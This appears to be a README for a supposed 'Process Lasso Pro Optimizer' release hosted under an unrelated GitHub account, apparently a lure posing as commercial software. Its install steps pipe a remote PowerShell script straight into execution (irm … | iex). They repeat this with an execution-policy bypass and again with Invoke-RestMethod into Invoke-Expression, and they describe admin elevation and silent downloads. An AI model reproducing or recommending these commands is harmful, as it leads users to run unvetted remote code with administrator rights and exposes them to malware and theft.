# Process Lasso Pro Optimizer
the intelligent Windows process priority optimizer that prevents CPU monopolization through ProBalance technology for dramatically improved PC and gaming responsiveness.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges to install ProBalance as a Windows background service.
- Downloads Process Lasso Pro installer silently with the watchdog service component.
- Configures ProBalance protection rules for all running processes automatically.
- Sets up the Game Mode hotkey and launches the real-time process monitor dashboard.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~40 MB free disk space

## Troubleshooting

**ProBalance is terminating priority for a critical business application**

Right-click the process in the list and add it to Configure ProBalance Exclusions to protect it from intervention.

**Game Mode does not boost the target game process as expected**

Right-click the game executable in the process list and select Always > High CPU Priority to force priority.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.